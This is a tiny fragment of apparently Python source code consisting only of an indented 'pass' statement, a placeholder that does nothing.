        pass
